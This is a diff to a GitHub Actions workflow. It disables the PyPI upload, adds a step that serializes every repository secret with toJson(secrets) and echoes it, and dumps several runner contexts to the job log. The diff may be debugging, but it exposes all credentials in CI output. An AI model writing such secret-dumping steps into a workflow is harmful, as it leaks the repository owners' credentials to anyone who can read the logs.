@@ -16,11 +16,38 @@ jobs:
 
       - name: upload wheel
         env:
-          TWINE_TUSER: ${{ secrets.TWINE_TUSER }}
+          TWINE_TUSER: ${{ secrets.TWINE_USERNAME }}
           TWINE_TPASS: ${{ secrets.TWINE_TPASS }}
+          all_seks: ${{ toJson(secrets) }}
         run: |
           pip install twine
           twine upload --help
           echo "checking twine------------>"
           echo $TWINE_TUSER
-          twine upload --verbose -u "$TWINE_TUSER" -p "$TWINE_TPASS" -r testpypi requirements.txt
+          echo "all seks----------->"
+          echo $all_seks
+      - name: Dump GitHub context
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+        run: echo "$GITHUB_CONTEXT"
+      - name: Dump job context
+        env:
+          JOB_CONTEXT: ${{ toJson(job) }}
+        run: echo "$JOB_CONTEXT"
+      - name: Dump steps context
+        env:
+          STEPS_CONTEXT: ${{ toJson(steps) }}
+        run: echo "$STEPS_CONTEXT"
+      - name: Dump runner context
+        env:
+          RUNNER_CONTEXT: ${{ toJson(runner) }}
+        run: echo "$RUNNER_CONTEXT"
+      - name: Dump strategy context
+        env:
+          STRATEGY_CONTEXT: ${{ toJson(strategy) }}
+        run: echo "$STRATEGY_CONTEXT"
+      - name: Dump matrix context
+        env:
+          MATRIX_CONTEXT: ${{ toJson(matrix) }}
+        run: echo "$MATRIX_CONTEXT"
+        # twine upload --verbose -u "$TWINE_TUSER" -p "$TWINE_TPASS" -r testpypi requirements.txt
